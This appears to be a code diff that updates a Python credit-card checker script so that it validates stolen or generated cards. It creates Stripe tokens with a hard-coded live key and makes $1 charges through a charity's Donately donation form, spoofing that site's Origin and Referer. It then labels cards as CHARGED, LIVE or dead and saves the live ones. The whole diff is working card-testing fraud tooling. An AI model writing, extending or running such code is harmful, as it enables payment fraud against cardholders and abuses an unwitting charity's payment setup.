@@ -15,7 +15,7 @@ import uuid
 from datetime import datetime
 
 
-VERSION = "2.2"
+VERSION = "2.3"
 
 
 class StripeChecker:
@@ -214,15 +214,15 @@ class StripeChecker:
         }
 
     def check_gateway_1(self, cc, month, year, cvv):
-        """Gateway 1: Stripe Checkout with real auth"""
+        """Gateway 1: Donately Stripe - Token + Charge"""
         
-        pk_key = 'pk_live_517EDIQCV9djTjhnHFKHnXhM2atKmyZ7oVnyJbnX0DwYNHgeuZRZkxKeHlEUILFe9wVYe1NDS72D34fJgZVbZgCxS00Ghr637bG'
+        pk_key = 'pk_live_51MJjGSR9GTt0CcXJYNHenVaATXNyK43YPRgUBgoRQDtrLCnk7YZ8OL7uhrQF3BJAs8vT8dPoKjORWC9JlwSwRiKs00QjcCzQMX'
         
         first_name, last_name = self.generate_name()
         email = self.generate_email()
         
-        # Create payment method
-        url = 'https://api.stripe.com/v1/payment_methods'
+        # Create token using Stripe tokens API
+        url = 'https://api.stripe.com/v1/tokens'
         
         headers = {
             'Accept': 'application/json',
@@ -232,24 +232,21 @@ class StripeChecker:
         }
         
         if len(year) == 2:
-            exp_year = year
+            exp_year = '20' + year
         else:
-            exp_year = year[-2:]
+            exp_year = year
         
         data = {
-            'type': 'card',
             'card[number]': cc,
             'card[cvc]': cvv,
             'card[exp_year]': exp_year,
             'card[exp_month]': month.zfill(2),
-            'billing_details[name]': f'{first_name} {last_name}',
-            'billing_details[email]': email,
-            'billing_details[address][country]': 'US',
-            'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
+            'card[name]': f'{first_name} {last_name}',
+            'card[address_country]': 'US',
             'key': pk_key,
         }
         
-        self.log_debug("GATEWAY 1 - CREATE PM", {
+        self.log_debug("GATEWAY 1 - CREATE TOKEN", {
             'card': f"{cc[:6]}******{cc[-4:]}",
             'exp': f"{month}/{exp_year}"
         })
@@ -257,7 +254,7 @@ class StripeChecker:
         response = self.session.post(url, headers=headers, data=data, timeout=30)
         result = response.json()
         
-        self.log_debug("GATEWAY 1 - PM RESPONSE", {
+        self.log_debug("GATEWAY 1 - TOKEN RESPONSE", {
             'status': response.status_code,
             'result': result
         })
@@ -265,32 +262,88 @@ class StripeChecker:
         if response.status_code != 200 or 'error' in result:
             return self.parse_stripe_error(result)
         
-        pm_id = result.get('id')
+        token_id = result.get('id')
+        if not token_id:
+            return {'success': False, 'status': 'ERROR', 'message': 'No token', 'code': 'no_token'}
         
-        # Now try to use this PM with a checkout session to get real validation
-        # For this we need to hit an actual merchant endpoint
+        # Now charge with Donately
+        import hashlib
+        charge_url = f"https://api.donately.com/v2/donations?account_id=act_f9b102ae7299&donation_type=cc&amount_in_cents=100&form_id=frm_5cb29a5d6955&x1={hashlib.md5(str(time.time()).encode()).hexdigest()}"
         
-        # Try creating a setup intent to validate card
-        setup_url = 'https://api.stripe.com/v1/setup_intents'
-        setup_data = {
-            'payment_method_types[]': 'card',
-            'payment_method': pm_id,
-            'confirm': 'true',
-            'usage': 'off_session',
-            'key': pk_key,
+        charge_headers = {
+            'Accept': '*/*',
+            'Content-Type': 'application/json; charset=UTF-8',
+            'Donately-Version': '2022-12-15',
+            'Origin': 'https://www-christwaymission-com.filesusr.com',
+            'Referer': 'https://www-christwaymission-com.filesusr.com/',
         }
         
-        self.log_debug("GATEWAY 1 - SETUP INTENT", {'pm_id': pm_id})
+        import json as json_lib
+        charge_payload = {
+            'first_name': first_name,
+            'last_name': last_name,
+            'email': email,
+            'currency': 'USD',
+            'recurring': False,
+            'country': 'US',
+            'payment_auth': json_lib.dumps({'stripe_token': token_id}),
+            'form': json_lib.dumps({'version': '5.8.117', 'id': 'frm_5cb29a5d6955'})
+        }
         
-        setup_response = self.session.post(setup_url, headers=headers, data=setup_data, timeout=30)
-        setup_result = setup_response.json()
-        
-        self.log_debug("GATEWAY 1 - SETUP RESPONSE", {
-            'status': setup_response.status_code,
-            'result': setup_result
+        self.log_debug("GATEWAY 1 - CHARGE REQUEST", {
+            'token': token_id[:20] + '...',
+            'amount': '$1.00'
         })
         
-        return self.parse_setup_intent_response(setup_result)
+        charge_response = self.session.post(charge_url, headers=charge_headers, json=charge_payload, timeout=30)
+        charge_result = charge_response.json()
+        
+        self.log_debug("GATEWAY 1 - CHARGE RESPONSE", {
+            'status': charge_response.status_code,
+            'result': charge_result
+        })
+        
+        return self.parse_donately_response(charge_result)
+    
+    def parse_donately_response(self, result):
+        """Parse Donately charge response"""
+        
+        # Check for successful donation
+        if result.get('object') == 'donation':
+            data = result.get('data', {})
+            if data.get('status') == 'processed':
+                return {
+                    'success': True,
+                    'status': 'CHARGED',
+                    'message': f"Charged $1.00 [ID: {data.get('id', 'N/A')}]",
+                    'code': 'charged'
+                }
+        
+        # Get error message
+        error_msg = result.get('message', '')
+        error_lower = error_msg.lower()
+        
+        # CVV related
+        if any(x in error_lower for x in ['cvc', 'cvv', 'security']):
+            return {'success': False, 'status': 'CCN', 'message': 'CVV Error - Card Live', 'code': 'ccn'}
+        
+        # Insufficient funds
+        if 'insufficient' in error_lower:
+            return {'success': False, 'status': 'LIVE', 'message': 'Insufficient Funds', 'code': 'insufficient'}
+        
+        # 3D Secure
+        if '3d' in error_lower or 'auth' in error_lower:
+            return {'success': False, 'status': 'LIVE', 'message': '3DS Required - Card Live', 'code': '3ds'}
+        
+        # Generic decline
+        if 'decline' in error_lower:
+            return {'success': False, 'status': 'DECLINED', 'message': error_msg, 'code': 'declined'}
+        
+        # Rate limit
+        if 'rate' in error_lower or 'limit' in error_lower:
+            return {'success': False, 'status': 'RATE_LIMITED', 'message': 'Rate Limited', 'code': 'rate_limit'}
+        
+        return {'success': False, 'status': 'DECLINED', 'message': error_msg or 'Unknown', 'code': 'unknown'}
 
     def check_gateway_2(self, cc, month, year, cvv):
         """Gateway 2: Alternative Stripe merchant (Donately)"""
@@ -592,12 +645,14 @@ def print_result(card, result, index, total):
     code = result.get('code', '')
     
     status_icons = {
+        'CHARGED': '[$$] CHARGED',
         'LIVE': '[++] LIVE',
         'VALID': '[OK] VALID',
         'CCN': '[##] CCN',
         'DECLINED': '[--] DECLINED',
         'DEAD': '[xx] DEAD',
         'ERROR': '[!!] ERROR',
+        'RATE_LIMITED': '[!!] RATE LIMITED',
         'UNKNOWN': '[??] UNKNOWN'
     }
     
@@ -660,7 +715,7 @@ def main():
             result = checker.process_card(cc, month, year, cvv)
             card_line, status = print_result(card, result, idx, len(cards))
             
-            if status in ['LIVE', 'VALID']:
+            if status in ['LIVE', 'VALID', 'CHARGED']:
                 stats['live'] += 1
                 save_result(live_file, card_line, f"{status} | {result.get('message', '')}")
             elif status == 'CCN':
